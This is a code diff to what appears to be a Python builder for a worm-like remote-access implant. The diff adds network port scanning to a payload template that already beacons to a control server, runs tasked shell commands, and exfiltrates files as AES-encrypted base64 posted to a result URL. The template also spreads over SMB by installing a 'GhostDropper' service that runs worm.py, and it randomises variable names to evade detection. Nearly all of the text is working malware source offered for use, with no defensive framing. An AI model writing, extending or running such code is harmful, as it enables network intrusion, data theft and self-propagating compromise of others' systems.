@@ -6,7 +6,6 @@ import subprocess
 import argparse
 from datetime import datetime
 
-# === Payload Template ===
 PAYLOAD_TEMPLATE = '''\
 import os
 import sys
@@ -17,13 +16,12 @@ import requests
 import subprocess
 import base64
 import random
-import Crypto.Cipher.AES 
+import Crypto.Cipher.AES
 import Crypto.Util.Padding
 
-SLEEP_TIME = 15  # base sleep in seconds
-JITTER_RANGE = 5  # jitter range (+/- seconds)
+SLEEP_TIME = 15
+JITTER_RANGE = 5
 
-# Inject absolute path to utils
 sys.path.insert(0, "{abs_utils_path}")
 from crypto import aes_encrypt
 
@@ -62,7 +60,7 @@ def lateral_move(ip, username, password, local_payload_path):
         print(f"[+] Payload uploaded to {{ip}}\\\\{{remote_path}}")
 
         service_name = "GhostDropper"
-        command = f"cmd.exe /c python C:\\\\Windows\\\\Temp\\\\worm.py"
+        command = "cmd.exe /c python C:\\\\Windows\\\\Temp\\\\worm.py"
         conn.createService(service_name, command)
         print(f"[+] Remote execution triggered on {{ip}}")
 
@@ -70,6 +68,26 @@ def lateral_move(ip, username, password, local_payload_path):
         print(f"[!] SMB SessionError: {{e}}")
     except Exception as ex:
         print(f"[!] Lateral move failed: {{ex}}")
+
+def scan_network(subnet, ports):
+    import ipaddress
+    results = {{}}
+    try:
+        network = ipaddress.IPv4Network(subnet, strict=False)
+        for ip in network.hosts():
+            ip_str = str(ip)
+            port_states = {{}}
+            for port in ports:
+                try:
+                    sock = socket.create_connection((ip_str, port), timeout=0.5)
+                    port_states[str(port)] = "open"
+                    sock.close()
+                except:
+                    port_states[str(port)] = "closed"
+            results[ip_str] = port_states
+    except Exception as e:
+        results["error"] = f"Scan failed: {{e}}"
+    return results
 
 def {beacon_func}():
     if IS_WORM:
@@ -97,13 +115,29 @@ def {beacon_func}():
                 {task_var} = {resp_var}.get("tasks", [])
 
                 for {cmd_var} in {task_var}:
-                    print(f"[+] Executing: {{{cmd_var}}}")
+                    print(f"[+] Executing: {{{{ {cmd_var} }}}}")
+
+                    if {cmd_var}.startswith("scan "):
+                        parts = {cmd_var}.split("ports:")
+                        target_subnet = parts[0].replace("scan", "").strip()
+                        ports = [int(p) for p in parts[1].split(",")]
+                        scan_results = scan_network(target_subnet, ports)
+
+                        {result_obj} = {{
+                            "hostname": {host_var},
+                            "command": {cmd_var},
+                            "result": scan_results
+                        }}
+                        {encrypted_result} = aes_encrypt(json.dumps({result_obj}))
+                        requests.post(RESULT_URL, data={encrypted_result}.encode())
+                        continue
+
                     if {cmd_var}.startswith("getfile "):
                         {file_path} = {cmd_var}.split(" ", 1)[1]
                         try:
                             with open({file_path}, "rb") as f:
                                 {b64data} = base64.b64encode(f.read()).decode()
-                            {result_var} = f"[EXFIL:{{{file_path}}}]\\\\n{{{b64data}}}"
+                            {result_var} = f"[EXFIL:{{{{ {file_path} }}}}]\\n{{{{ {b64data} }}}}"
                         except Exception as e:
                             {result_var} = f"[!] Failed to read file: {{e}}"
                     else:
@@ -113,7 +147,7 @@ def {beacon_func}():
                         except subprocess.CalledProcessError as e:
                             {result_var} = f"[!] Command failed: {{e.output.decode().strip()}}"
 
-                    print(f"[>] Sending result:\\n{{{{{result_var}}}}}")
+                    print(f"[>] Sending result:\\n{{{{ {result_var} }}}}")
 
                     {result_obj} = {{
                         "hostname": {host_var},
@@ -133,6 +167,7 @@ def {beacon_func}():
 if __name__ == "__main__":
     {beacon_func}()
 '''
+
 
 
 # === Helpers ===
